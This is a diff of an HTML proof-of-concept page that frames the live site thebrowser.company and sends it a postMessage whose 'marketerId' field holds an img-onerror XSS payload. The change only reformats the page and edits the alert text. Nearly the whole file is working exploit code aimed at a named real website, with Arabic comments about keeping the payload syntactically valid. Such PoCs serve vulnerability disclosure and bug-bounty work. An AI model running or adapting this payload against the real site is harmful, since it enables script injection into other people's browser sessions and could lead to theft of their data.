@@ -1,32 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>XSS PoC - thebrowser.company</title>
-</head>
-<body>
-  <h1>✅ DOM XSS via postMessage</h1>
-  <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border:1px solid #000;"></iframe>
+<html>
+  <head>
+    <title>XSS PoC - thebrowser.company</title>
+  </head>
+  <body>
+    <h1>✅ PoC: DOM XSS via postMessage</h1>
+    <iframe id="target" src="https://thebrowser.company" width="100%" height="600" style="border: 2px solid black;"></iframe>
 
-  <script>
-    const iframe = document.getElementById("target");
+    <script>
+      const iframe = document.getElementById("target");
 
-    iframe.onload = () => {
-      console.log("✅ iframe loaded");
+      iframe.onload = () => {
+        console.log("✅ iframe loaded");
 
-      // البايلود الآمن الذي لا يسبب syntax error
-      const payload = {
-        message: "OB_SHOULD_SHOW_PICKER",
-        content: {
-          marketerId: [
-            "<img src='x' onerror='alert(document.domain)'>"
-          ]
-        }
+        // تأكد من أن البايلود مكتوب بصيغة سليمة
+        const payload = {
+          message: "OB_SHOULD_SHOW_PICKER",
+          content: {
+            marketerId: [
+              "<img src='x' onerror='alert(\"XSS inside thebrowser.company\")'>"
+            ]
+          }
+        };
+
+        console.log("🚀 Sending postMessage...");
+        iframe.contentWindow.postMessage(payload, "*");
       };
-
-      console.log("🚀 Sending XSS payload via postMessage...");
-      iframe.contentWindow.postMessage(payload, "*");
-    };
-  </script>
-</body>
+    </script>
+  </body>
 </html>
